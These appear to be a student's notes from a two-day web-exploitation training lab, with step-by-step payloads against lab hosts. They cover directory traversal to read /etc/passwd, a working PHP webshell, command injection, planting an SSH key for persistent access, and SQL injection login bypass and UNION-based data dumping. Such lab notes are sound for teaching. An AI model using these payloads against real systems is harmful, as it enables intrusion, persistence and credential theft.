+-------------------------------------------------------------------[DAY 1]------------------------------------------------------------------------------+
GET / HTTP/1.1

GET = HTTP Method to Request/Retrieve
/ = www.google.com/
HTTP/1.1 = HTTP Version being utilized

GET /maps HTTP/1.1
/maps = www.google.com/maps


HTTP/1.1 200 OK
HTTP/1.1 = HTTP Version being utilized
200 = Status Code
OK = Status Message

Status Codes:
https://en.wikipedia.org/wiki/List_of_HTTP_status_codes

X|XX 

4|XX = Client Error
4|04 = Not Found

GET = Requesting/Retrieving Info
POST = Sending info (i.e. Login credentials)

Forums, Email

GET = Navigate to www.gmail.com
POST = Submit username and password credentials



document.location;
document.cookie;

function click() {
code in here that defines what this function does
}

Inside the Console Tab:
click();

curl 'https://quotes.toscrape.com/' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://www.google.com/' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site' -H 'Sec-Fetch-User: ?1' -H 'Cache-Control: max-age=0'Sec-Fetch-User: ?1' -H 'Cache-Control: max-age=0'

wget -r -l2 -P /tmp www.reddit.com
-r = recursive
-l2 = Defining recursive layers
-P = /tmp

Z://file/tmp/192.168.28.111

If you have download all the necessary pages, maybe Hyperlinks will work

Hyperlinks > 192.168.28.111

Hyperlinks > 192.168.28.222/info

Functions > 

curl -o example.html http://www.reddit.com/

-o = Specify different destination name

http://10.50.34.125/webexample/htmldemo.html


<script>
function myFunction() {
document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>


<a Id="demo">Some Text Here.</a>

Dev Console > Console Tab:
myFunction();

<a Id="demo">Paragraph changed.</a>

http://10.50.34.125/java/Javademo.html

<script>
function changeText() {
  x = document.getElementById("mySelect");
  x.options[x.selectedIndex].text = "Melon";
}
</script>

<select id="mySelect">
  <option>Apple</option>
  <option>Orange</option>
  <option>Pineapple</option>
  <option>Banana</option>
  
###Recon/Scanning

1. Host Discovery (ping sweep)

2. Host Enumeration (port scan)
nmap -Pn -T5 10.50.34.125 -p-

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
3389/tcp closed ms-wbt-server
8080/tcp closed http-proxy
9999/tcp closed abyss

3. Service Enumeration (-sV|banner.nse)

nmap -Pn -T5 10.50.34.125 -sV -p 22,80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


nmap -Pn -T5 10.50.34.125 --script=banner.nse -p 22,80

PORT   STATE SERVICE
22/tcp open  ssh
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5
80/tcp open  http

4. Web Enumeration

a. nmap
cd /usr/share/nmap/scripts/
ls | grep http

nmap -Pn -T5 10.50.34.125 --script= -p 80

nmap -Pn -T5 10.50.34.125 --script="http-*" -p 80

http-enum.nse
http-robots.txt.nse


nmap -Pn -T5 10.50.34.125 --script=http-enum.nse -p 80

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /robots.txt: Robots file
|   /java/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /path/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

What do our results mean?
-Potential existing web directories and webpages

robots.txt
java/
path/
uploads/

nmap -Pn -T5 10.50.34.125 --script=http-robots.txt.nse -p 80

PORT   STATE SERVICE
80/tcp open  http
| http-robots.txt: 2 disallowed entries
|_/cross /

robots.txt exist
/cross
/

b. nikto

sudo apt update -y && sudo apt install nikto -y

nikto -h 10.50.34.125

uploads/
chat/
cmdinjection/
java/
path/
cross/

c. robots.txt

http://10.50.34.125/robots.txt

User-agent: *
Allow: /uploads
Allow: /chat
Allow: /cmdinjection
Allow: /java
Allow: /path
Allow: /webexampe
Disallow: /cross
Disallow: /

What is the robots.txt file?
-To tell what webcrawlers what they can and cannot index

What is our goal in Web Enum?
-Find out the existing webpages and webdirectories

Why is this robots.txt file important for us?
-Tells us what webpages and webdirectories may exist

Allow: /uploads
Allow: /chat
Allow: /cmdinjection
Allow: /java
Allow: /path
Allow: /webexampe
Disallow: /cross
Disallow: /

d. Legitimate Surfing

Navigate to the webpages and webdirectories found


5. Web Exploitation 

a. Directory Traversal - Information

http://10.50.34.125/path/pathdemo.php

../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../etc/passwd

/etc/passwd - User information

root:x:0:0:root:/root:/bin/bash
root = User
/bin/bash = Login Shell
/root = Home

/etc/group

root
adm
sudo

/etc/hosts
192.168.28.1 Webserver
192.168.28.250 DNS_Server

/etc/resolv.conf

Internal IP Networks we can scan for

/etc/networks


http://10.50.34.125/path/pathdemo.php
http://10.50.34.125/path/pathdemo.php?
http://10.50.34.125/path/pathdemo.php?myfile
http://10.50.34.125/path/pathdemo.php?myfile=
http://10.50.34.125/path/pathdemo.php?myfile=../../../../../../../../etc/passwd <=== Works

http://10.50.34.125/path/pathdemo.php?myfile=../../../../../../../../etc/passwd&
http://10.50.34.125/path/pathdemo.php?myfile=../../../../../../../../etc/passwd&submit=File+look+up <=== Works

b. Malicious File Upload (Webshell) - Information/Access

Can you upload? Yes (.php)
Are file extensions being sanitized? No
Can you access the uploads directory? Yes

##### webshell.php ######
<HTML><BODY>
<Form METHOD="GET" NAME="badform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="hello">
</Form>
<?php system($_GET['cmd']);?>
</BODY></HTML>
##### webshell.php ######

http://10.50.34.125/uploads/webshell.php

Validate WebShell Works by running commands:
id
whoami

c. Command Injection - Information/Access

http://10.50.34.125/cmdinjection/cmdinjectdemo.php

whoami; id

; id
; whoami
; cat /etc/passwd
; cat /etc/hosts

bb/cc. SSH Keys - Access

Pair with either Command Injection or WebShell

Example:
ssh student@X.X.X.X
password


1. Generate our SSH Keys
On whichever host you plan on logging in from, generate keys

ssh-keygen -t rsa -b 4096

Your identification has been saved in /home/student/.ssh/id_rsa.
Your public key has been saved in /home/student/.ssh/id_rsa.pub.

cat /home/student/.ssh/id_rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC7R+sZ1LYgAx50qcpuy+07uUTLmmeJEwWNGSH4Ogafj+QQ9zdG4DKlBrEfBaHMDGwExwM6WVGyZ3uRK3H4jkiiPGU1nsmgF984VYqcDTJUbsMLCsLId7CaJLyY4BlWgsPrIej5gbM3LR9v8dgVv0My3Q59mmQDY7SeVyl51IM8fjqWdGAIJAnHIcbyJ8SyoeEbdeYnNm/6mBZtCpodPKNhJd2dtMRbqGaO040YPHxUNYCjjIYm6i7EStHgk0A+OWOghTtRBGm5ZwEt4K3/uJ554ELdc5qChNh7xL41M/oMUZhGyEcy3x67pycRdtDP4WH/wNR0tO7yOhrgWDCeNT3qSaofajpwGT/cJf5SqSfJb2TUho1hkh2mF09S8HWVqqoEPnkj/685RoCQTOPwS/6xQnUe3/mNWS3alo0RV6i03pdWMRbyRh0dW0pR3OvqQClNQtdkGrske2VM3cF/bc4NU1pGhwUtqtUi+aFL22xt1n8tg86fedByYRT8unNiAF3mzT1MPiTjwKwDkufgQwqxblajfhbWs76cPiLnJg0FRsb6efnmdqW4tT6P72TQyKdu5cbsb3JMxBjWDxOhXtzsHCiVarQrRjGc4J0LDBwWvnC/qweJrD87bPT+L5fTxuVX38U6+hyDC6O8tegqshP/6TkqYCNAji0Z4x+CKvFvLw== student@lin-ops

2. Determine the user on the webserver

; whoami

Result:
www-data

3. Determine the user's home directory

; cat /etc/passwd

; cat /etc/passwd | grep -i "www-data"


www-data:x:33:33:www-data:/var/www:/bin/bash
User: www-data
Home Directory: /var/www
Login Shell: /bin/bash

4. Determine if .ssh/ directory exists in the users home directory, if not create it

; ls -la /var/www

5. Create .ssh/ directory

; mkdir /var/www/.ssh

6. Validate the .ssh/ directory has been created

; ls -la /var/www

7. Inject our key into the authorized_keys file

echo "" >> /var/www/.ssh/authorized_keys

; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC7R+sZ1LYgAx50qcpuy+07uUTLmmeJEwWNGSH4Ogafj+QQ9zdG4DKlBrEfBaHMDGwExwM6WVGyZ3uRK3H4jkiiPGU1nsmgF984VYqcDTJUbsMLCsLId7CaJLyY4BlWgsPrIej5gbM3LR9v8dgVv0My3Q59mmQDY7SeVyl51IM8fjqWdGAIJAnHIcbyJ8SyoeEbdeYnNm/6mBZtCpodPKNhJd2dtMRbqGaO040YPHxUNYCjjIYm6i7EStHgk0A+OWOghTtRBGm5ZwEt4K3/uJ554ELdc5qChNh7xL41M/oMUZhGyEcy3x67pycRdtDP4WH/wNR0tO7yOhrgWDCeNT3qSaofajpwGT/cJf5SqSfJb2TUho1hkh2mF09S8HWVqqoEPnkj/685RoCQTOPwS/6xQnUe3/mNWS3alo0RV6i03pdWMRbyRh0dW0pR3OvqQClNQtdkGrske2VM3cF/bc4NU1pGhwUtqtUi+aFL22xt1n8tg86fedByYRT8unNiAF3mzT1MPiTjwKwDkufgQwqxblajfhbWs76cPiLnJg0FRsb6efnmdqW4tT6P72TQyKdu5cbsb3JMxBjWDxOhXtzsHCiVarQrRjGc4J0LDBwWvnC/qweJrD87bPT+L5fTxuVX38U6+hyDC6O8tegqshP/6TkqYCNAji0Z4x+CKvFvLw== student@lin-ops" >> /var/www/.ssh/authorized_keys

8. Validate the public is inside the authorized_keys file

; cat /var/www/.ssh/authorized_keys

9. Login from the workstation you generated the key from

ssh www-data@10.50.34.125


### Webservers Default Web Directories
http://10.50.34.125/ = /var/www/html
http://10.50.34.125/uploads = /var/www/html/uploads

d = Directory

	drwxr-xr-x 2 root root     4096 Apr 26 04:15 chat
	drwxr-xr-x 2 root root     4096 Apr 26 04:15 cmdinjection
	drwxr-xr-x 2 root root     4096 Apr 26 04:15 cross
-rw-r--r-- 1 root root      890 Apr 25 22:09 fileUpload.php
-rw-r--r-- 1 root root      380 Apr 25 22:09 index.html
	drwxr-xr-x 2 root root     4096 Apr 26 04:15 java
	drwxr-xr-x 2 root root     4096 Apr 26 04:15 path
-rw-r--r-- 1 root root      211 Apr 25 22:08 robots.txt
	drwxrwxrwx 2 root root     4096 Apr 27 17:31 uploads
	drwxr-xr-x 2 root root     4096 Apr 26 04:15 webexample
	
	
/var/www/html = Webservers Default Web Directories
/var/www = www-data's Home Directory


==========================================================================================================================================================


+----------------------------------------------------------------[DAY 2]--------------------------------------------------------------------------------+
Database = File|DOD
Table = Sheets|USMC, USAF
Column = Columns|Rank,Lname,EDIPI

mysql

mysql --user=root --pass=password

show databases;

Default Database:
information_schema = Database of databases, meta data
mysql = Configuration, user information             
performance_schema = Status information

Custom:
session = Custom

show tables from <database>;
show tables from session;

Tables that exist inside the session database:

Tires          
car
session_log
user
userinfo

Generic SQL Statement:
select <column> from <database>.<table>;
select * from session.Tires;

select tireid,name,size from session.Tires;

select * from session.car;
select carid,type,color from session.car;

Combining Statements
1. Nesting Statements
select * from session.car; select * from session.Tires;

select * from session.Tires; select * from session.car;

2. Joining Statements

UNION command
select * from session.car UNION select * from session.Tires;

car table = 6
Tires = 4

Add or Remove Columns

1 | 2 | 3 | 4 | 5 | 6
1 | 2 | 3 | 4 | null | null


1,2,3
null

select * from session.car UNION select *,1,2 from session.Tires;

select * from session.car UNION select *,null,null from session.Tires;

select * from session.car UNION select *,'a','a' from session.Tires;


select carid,name,type,cost from session.car UNION select * from session.Tires;

describe <database>.<table>;
describe session.car;

carid | name | type | cost | color | year
int | varchar | varchar | int | varchar | int



$name = [ daniel ]
$pass = [ password ]

SELECT id FROM users WHERE name='$name' AND pass='$pass';

SELECT id FROM users WHERE name='daniel' AND pass='password';


$name = [ danil' or 1='1 ]
$pass = [ passw0rd' or 1='1 ]

SELECT id FROM users WHERE name='$name' AND pass='$pass';

SELECT id FROM users WHERE name='danil' or 1='1' AND pass='passw0rd' or 1='1';

1=1 True

10.50.21.144

SQL Injection - Login - Credentials

dan // thisismypassword

Query String Parameters:
username
passwd

1. Determine if Login page (POST Method) is vulnerable to SQL injection via Truth Statement 

Generic Truth Statement
<value>' or 1='1
<value>' or 1='1;
<value>' or 1='1; #
<value>' or 1='1; --

dan' or 1='1 		<=== Works
dan' or 1='1;
dan' or 1='1; #
dan' or 1='1; --

What did we determine?
1. Vulnerable to SQL Injection
2. admin is a user

2. Exploit Vulnerable Login Page (GET Method) w/ Truth Statement

http://10.50.21.144/login.php

What are the Query String Parameters?
username
passwd

http://10.50.21.144/login.php
http://10.50.21.144/login.php?
http://10.50.21.144/login.php?username
http://10.50.21.144/login.php?username=
http://10.50.21.144/login.php?username=dan' or 1='1
http://10.50.21.144/login.php?username=dan' or 1='1&
http://10.50.21.144/login.php?username=dan' or 1='1&passwd
http://10.50.21.144/login.php?username=dan' or 1='1&passwd=
http://10.50.21.144/login.php?username=dan' or 1='1&passwd=dan' or 1='1

http://10.50.21.144/login.php?passwd=dan' or 1='1&username=dan' or 1='1

    [0] => Luke_Skywalker
    [name] => Luke_Skywalker
    [1] => Jedi
    [pass] => Jedi
)
1Array
(
    [0] => Darth_Vader
    [name] => Darth_Vader
    [1] => Sith
    [pass] => Sith
)
1Array
(
    [0] => c3p0
    [name] => c3p0
    [1] => annoying
    [pass] => annoying
)
1Array
(
    [0] => Batman
    [name] => Batman
    [1] => BWyane
    [pass] => BWyane
	



http://10.50.21.144/Union.html
SQL Injection - Webpages - POST Method
0. Behavior Analysis

Only valid values will display information from the table on a webpage

1. Determine vulnerable webpage via Truth Statement

Generic Truth Statement (POST)
<value>' or 1='1
<value>' or 1='1;
<value>' or 1='1; #
<value>' or 1='1; --

Ford' or 1='1		#NOPE
Ford' or 1='1;		#NOPE
Ford' or 1='1; #	#NOPE
Ford' or 1='1; --	#NOPE

Dodge' or 1='1		#NOPE
Dodge' or 1='1;		#NOPE
Dodge' or 1='1; #	#NOPE
Dodge' or 1='1; --	#NOPE

Honda' or 1='1		#NOPE
Honda' or 1='1;		#NOPE
Honda' or 1='1; #	#NOPE
Honda' or 1='1; --	#NOPE

Audi' or 1='1		#Works
Audi' or 1='1;		#Works
Audi' or 1='1; #	#Works
Audi' or 1='1; --	#Works

2. Determine the number of columns that exist on the table displayed on the webpage via Fuzzing

Rows: 5
Columns: 4 <=== Lowest

We start with the lowest number!

Audi' or 1='1;

Audi' UNION select 1,2,3,4	#NOPE
Audi' UNION select 1,2,3,4;	#NOPE
Audi' UNION select 1,2,3,4;	# #NOPE
Audi' UNION select 1,2,3,4;	-- #NOPE

Audi' UNION select 1,2,3,4,5	#NOPE
Audi' UNION select 1,2,3,4,5;	#NOPE
Audi' UNION select 1,2,3,4,5;# 	#WORKS
Audi' UNION select 1,2,3,4,5;-- #NOPE

3. Determine the number columns, the order, and if there are any hidden columns

Columns: 5
Display Order: 1,3,4,5
Hidden: 2

Display Order: 1,3,4,5
Backend Order: 1,2,3,4,5

4. Dumping/Extracting Information via Golden Statement

Audi' UNION select 1,2,3,4,5;# 	#WORKS

Generic SQL Statements
select <column> from <database>.<table>

Generic Golden Statement
select table_schema,table_name,column_name from information_schema.columns

information_schema = database, database of database, provides all information pertaining to database information

columns = table, that exist inside the information_schema database

table_schema = column inside the columns table, list out database names

table_name = column inside the columns table, list out table names

column_name = column inside the columns table, list out column names


Audi' UNION select 1,2,3,4,5;#
Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns; #

1 = table_schema = database names
2 = 2 = placeholder, hidden
3 = table_name = table names
4 = column_name = column names
5 = 5 = placeholder

5. Extract desired information
id,name,pass
session
user

Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns; #

Audi' UNION select id,2,name,pass,5 from session.user; #



SQL Injection - Webpages - GET Method
0. Behavioral Analysis

http://10.50.21.144/uniondemo.php?Selection=1&Submit=Submit
http://10.50.21.144/uniondemo.php?Selection=2&Submit=Submit
http://10.50.21.144/uniondemo.php?Selection=3&Submit=Submit
http://10.50.21.144/uniondemo.php?Selection=4&Submit=Submit

1. Determine vulnerable webpage via Truth Statement

Generic Truth Statement (GET)
<value> or 1=1
<value> or 1=1;
<value> or 1=1; #
<value> or 1=1; --

http://10.50.21.144/uniondemo.php?Selection=1 or 1=1
http://10.50.21.144/uniondemo.php?Selection=1 or 1=1;
http://10.50.21.144/uniondemo.php?Selection=1 or 1=1;#
http://10.50.21.144/uniondemo.php?Selection=1 or 1=1;--

http://10.50.21.144/uniondemo.php?Selection=2 or 1=1 	#Works
http://10.50.21.144/uniondemo.php?Selection=2 or 1=1;	#Works
http://10.50.21.144/uniondemo.php?Selection=2 or 1=1;#	#Works
http://10.50.21.144/uniondemo.php?Selection=2 or 1=1;--	#Works

http://10.50.21.144/uniondemo.php?Selection=3 or 1=1	#Works
http://10.50.21.144/uniondemo.php?Selection=3 or 1=1;	#Works
http://10.50.21.144/uniondemo.php?Selection=3 or 1=1;#	#Works
http://10.50.21.144/uniondemo.php?Selection=3 or 1=1;--	#Works

http://10.50.21.144/uniondemo.php?Selection=4 or 1=1	#Works
http://10.50.21.144/uniondemo.php?Selection=4 or 1=1;	#Works
http://10.50.21.144/uniondemo.php?Selection=4 or 1=1;#	#Works
http://10.50.21.144/uniondemo.php?Selection=4 or 1=1;--	#Works


2. Determine the number of columns that exist on the table displayed on the webpage via Fuzzing

Rows: 5
Columns: 3 <=== Lowest

We start fuzzing from the lowest number

http://10.50.21.144/uniondemo.php?Selection=2 or 1=1 
http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3 	#Works
http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3; 	#Works
http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3;#	#Works
http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3;-- #Works


3. Determine the number columns, the order, and if there are any hidden columns
Columns: 3
Display Order: 1,3,2
Hidden: N/A

Backend Order:
1		|2		|3

Webpage Order:
1		|3		|2


4. Dumping/Extracting Information via Golden Statement

Generic SQL Statements
select <column> from <database>.<table>

Generic Golden Statement
select table_schema,table_name,column_name from information_schema.columns

information_schema = database, database of database, provides all information pertaining to database information

columns = table, that exist inside the information_schema database

table_schema = column inside the columns table, list out database names

table_name = column inside the columns table, list out table names

column_name = column inside the columns table, list out column names


http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3 	#Works
http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3; 	#Works
http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3;#	#Works
http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3;-- #Works

http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns

Backend Order:
1				| 2				| 3
table_schema 	| table_name 	| column_name

Webpage Display Order:
1				| 3				| 2
table_schema	| column_name	| table_name


http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns

Backend Order:
1				| 2				| 3
table_schema 	| column_name 	| table_name

Webpage Display Order:
1				| 3				| 2
table_schema	| table_name	| column_name


5. Extract desired information

name,type,year
session
car

Webpage Display Order: year type name

http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns

http://10.50.21.144/uniondemo.php?Selection=2 UNION select name,type,year from session.car

http://10.50.21.144/uniondemo.php?Selection=2 UNION select year,name,type from session.car



SQL Injection - Filtering (WHERE)
http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns


http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns where table_schema='session'


SQL Injection - Functions (LOAD_FILE())

http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3

http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,load_file('/etc/passwd')

/etc/passwd
/etc/group
/etc/networks
/etc/hosts
/etc/resolv.conf


SQL Injection - SQL Version (@@version)

http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3

http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,@@version

10.1.48-MariaDB-0ubuntu0.18.04.1 


SQL Injection Considerations - Escaping Characters (\)


https://dev.mysql.com/doc/refman/8.0/en/string-literals.html

=========================================================================================================================================================
